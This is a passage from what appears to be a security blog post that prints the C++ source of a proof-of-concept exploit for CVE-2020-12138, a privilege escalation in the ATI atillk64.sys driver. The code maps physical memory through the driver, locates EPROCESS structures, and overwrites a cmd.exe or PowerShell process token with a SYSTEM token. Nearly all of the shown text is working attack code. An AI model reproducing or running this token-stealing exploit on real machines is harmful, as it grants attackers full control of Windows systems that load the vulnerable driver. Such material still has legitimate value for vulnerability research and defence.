                    <span style="color:#66d9ef">for</span> (INT64 x <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; x <span style="color:#f92672">&lt;</span> (<span style="color:#ae81ff">0x100</span>); x <span style="color:#f92672">=</span> x <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10</span>)
                    {
                        INT64 header_address <span style="color:#f92672">=</span> test_address <span style="color:#f92672">+</span> x;
                        INT32 header_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT32)header_address;
                        <span style="color:#66d9ef">if</span> (header_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x00B80003</span>) <span style="color:#75715e">//  &#34;Header&#34; ending
</span><span style="color:#75715e"></span>                        {
                            <span style="color:#75715e">// We found a &#34;header&#34;, this is a legit &#34;Proc&#34;
</span><span style="color:#75715e"></span>                            proc_count<span style="color:#f92672">++</span>;

                            <span style="color:#75715e">// This is the literal physical mem addr for the
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// &#34;Proc&#34; pool tag
</span><span style="color:#75715e"></span>                            INT64 temp_addr <span style="color:#f92672">=</span> input_buff.start_address <span style="color:#f92672">+</span> i;

                            <span style="color:#75715e">// This address might not be page-aligned to 0x1000
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// so find out how far off from a multiple of 
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// 0x1000 we are. This value is stored in our 
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// PROC_DATA struct in the page_entry_offset
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// member.
</span><span style="color:#75715e"></span>                            INT64 modulus <span style="color:#f92672">=</span> temp_addr <span style="color:#f92672">%</span> <span style="color:#ae81ff">0x1000</span>;
                            proc_data.page_entry_offset.push_back(modulus);

                            <span style="color:#75715e">// This is the page-aligned address where, either
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// small or large paged memory will hold our &#34;Proc&#34;
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// chunk. We store this as our proc_address member
</span><span style="color:#75715e"></span>                            <span style="color:#75715e">// in PROC_DATA.
</span><span style="color:#75715e"></span>                            INT64 page_address <span style="color:#f92672">=</span> temp_addr <span style="color:#f92672">-</span> modulus;
                            proc_data.proc_address.push_back(
                                page_address);
                            proc_data.header_size.push_back(x);
                        }
                    }
                }
            }
            iteration<span style="color:#f92672">++</span>;
        }
        <span style="color:#66d9ef">else</span>
        {
            <span style="color:#75715e">// DeviceIoControl failed
</span><span style="color:#75715e"></span>            iteration<span style="color:#f92672">++</span>;
            failures<span style="color:#f92672">++</span>;
        }
    }
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">Proc</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> chunks found</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Failed DeviceIoControl calls: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> failures <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Total DeviceIoControl calls: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> iteration <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;

    <span style="color:#75715e">// Returns struct of two vectors, one holds Proc chunk address
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// one holds header-size for that Proc chunk.
</span><span style="color:#75715e"></span>    <span style="color:#66d9ef">return</span> proc_data;
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">parse_procs</span>(HANDLE device_handle, <span style="color:#66d9ef">struct</span> <span style="color:#a6e22e">PROC_DATA</span> proc_data) {

    INT64 SYSTEM_token <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    INT64 cmd_token_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
    <span style="color:#66d9ef">bool</span> SYSTEM_found <span style="color:#f92672">=</span> false;

    LPVOID output_buff <span style="color:#f92672">=</span> VirtualAlloc(
        NULL,
        <span style="color:#ae81ff">0x8</span>,
        MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE,
        PAGE_EXECUTE_READWRITE);

    <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> proc_data.proc_address.size(); i<span style="color:#f92672">++</span>)
    {
        <span style="color:#75715e">// We need to map 0x1000 bytes from our &#34;Proc&#34; tag so that we can parse
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// out all the EPROCESS members we&#39;re interested in. The deepest member
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// is ImageFileName at offset 0x450 from the end of the header. Header
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// sizes varied from 0x20 to 0x90 in my testing. start_address will be
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// the address of the beginning of each 0x1000 aligned address closest
</span><span style="color:#75715e"></span>        <span style="color:#75715e">// to the &#34;Proc&#34; tag we found.
</span><span style="color:#75715e"></span>        DWORDLONG num_of_bytes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000</span>;
        DWORDLONG padding <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4141414141414141</span>;
        INT64 start_address <span style="color:#f92672">=</span> proc_data.proc_address[i];

        INPUT_BUFFER input_buff <span style="color:#f92672">=</span> { start_address, num_of_bytes, padding };

        DWORD bytes_returned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;

        <span style="color:#66d9ef">if</span> (DeviceIoControl(
            device_handle,
            IOCTL,
            <span style="color:#f92672">&amp;</span>input_buff,
            <span style="color:#66d9ef">sizeof</span>(input_buff),
            output_buff,
            <span style="color:#66d9ef">sizeof</span>(output_buff),
            <span style="color:#f92672">&amp;</span>bytes_returned,
            NULL))
        {
            <span style="color:#75715e">// Pointer to the beginning of our process space with the mapped
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// 0x1000 bytes of physmem
</span><span style="color:#75715e"></span>            INT64 mapped_address <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)output_buff;

            <span style="color:#75715e">// mapped_address is mapping from our page entry where, on that
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// page, exists a &#34;Proc&#34; tag. Therefore, we need both the header
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// size and the offset from the page entry to the &#34;Proc&#34; tag so
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// we can calculate the static offsets/values of the EPROCESS
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// memebers ImageFileName, Token, UniqueProcessId...
</span><span style="color:#75715e"></span>            INT64 imagename_address <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i]
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x450</span>; <span style="color:#75715e">//ImageFileName
</span><span style="color:#75715e"></span>            INT64 imagename_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)imagename_address;

            INT64 proc_token_addr <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i]
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x360</span>; <span style="color:#75715e">//Token
</span><span style="color:#75715e"></span>            INT64 proc_token <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)proc_token_addr;

            INT64 pid_addr <span style="color:#f92672">=</span> mapped_address <span style="color:#f92672">+</span>
                proc_data.header_size[i] <span style="color:#f92672">+</span> proc_data.page_entry_offset[i]
                <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x2e8</span>; <span style="color:#75715e">//UniqueProcessId
</span><span style="color:#75715e"></span>            INT64 pid_value <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(PINT64)pid_addr;

            <span style="color:#75715e">// See if the ImageFileName 64 bit hex value is in our vector of
</span><span style="color:#75715e"></span>            <span style="color:#75715e">// common SYSTEM processes
</span><span style="color:#75715e"></span>            <span style="color:#66d9ef">int</span> sys_result <span style="color:#f92672">=</span> count(SYSTEM_procs.begin(), SYSTEM_procs.end(),
                imagename_value);
            <span style="color:#66d9ef">if</span> (sys_result <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span> and SYSTEM_found <span style="color:#f92672">==</span> false)
            {
                SYSTEM_token <span style="color:#f92672">=</span> proc_token;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] SYSTEM process found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - ImageFileName value: &#34;</span>
                    <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)imagename_address <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token value: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token address: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token_addr
                    <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - UniqueProcessId: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> pid_value <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
                SYSTEM_found <span style="color:#f92672">=</span> true;
            }
            <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> (imagename_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6568737265776f70</span> or
                imagename_value <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x6578652e646d63</span>)  <span style="color:#75715e">// powershell or cmd
</span><span style="color:#75715e"></span>            {
                cmd_token_addr <span style="color:#f92672">=</span> proc_token_addr;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] cmd.exe process found!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - ImageFileName value: &#34;</span>
                    <span style="color:#f92672">&lt;&lt;</span> (<span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)imagename_address <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token value: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - Token address: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span> proc_token_addr
                    <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
                cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;    - UniqueProcessId: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> dec <span style="color:#f92672">&lt;&lt;</span> pid_value <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
            }
        }
        <span style="color:#66d9ef">else</span>
        {
            <span style="color:#75715e">//DeviceIoControl failed
</span><span style="color:#75715e"></span>        }
    }
    <span style="color:#66d9ef">if</span> ((<span style="color:#f92672">!</span>cmd_token_addr) or (<span style="color:#f92672">!</span>SYSTEM_token))
    {
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Token swapping requirements not met.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Last physical address scanned: &#34;</span> <span style="color:#f92672">&lt;&lt;</span> hex <span style="color:#f92672">&lt;&lt;</span>
            proc_data.proc_address.back() <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[!] Better luck next time!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        exit(<span style="color:#ae81ff">1</span>);
    }
    <span style="color:#66d9ef">else</span>
    {
        <span style="color:#f92672">*</span>(PINT64)cmd_token_addr <span style="color:#f92672">=</span> SYSTEM_token;
        cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;[&gt;] SYSTEM and cmd.exe token info found, swapping tokens...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
        exit(<span style="color:#ae81ff">0</span>);
    }
}

<span style="color:#66d9ef">void</span> <span style="color:#a6e22e">ascii</span>() {

    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n\t</span><span style="color:#e6db74">     CVE-2020-12138 Proof-of-Concept</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">   EOP in ATI Technologies atillk64.sys</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>;
    cout <span style="color:#f92672">&lt;&lt;</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t\t\t</span><span style="color:#e6db74">       by @h0mbre_</span><span style="color:#ae81ff">\n\n\n</span><span style="color:#e6db74">&#34;</span>;
}

<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {

    ascii();

    <span style="color:#75715e">// Grab handle to our device driver atillk64.sys
</span><span style="color:#75715e"></span>    HANDLE hFile <span style="color:#f92672">=</span> get_handle(DEVICE_NAME);

    <span style="color:#75715e">// Return a pointer to our output buffer
</span><span style="color:#75715e"></span>    PROC_DATA proc_data <span style="color:#f92672">=</span> map_memory(hFile);

    <span style="color:#75715e">// Look through our PROC_DATA struct for the values we need, ie EPROCESS
</span><span style="color:#75715e"></span>    <span style="color:#75715e">// members for the processes we&#39;re interested in
</span><span style="color:#75715e"></span>    parse_procs(hFile, proc_data);
}
</code></pre></div>
    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
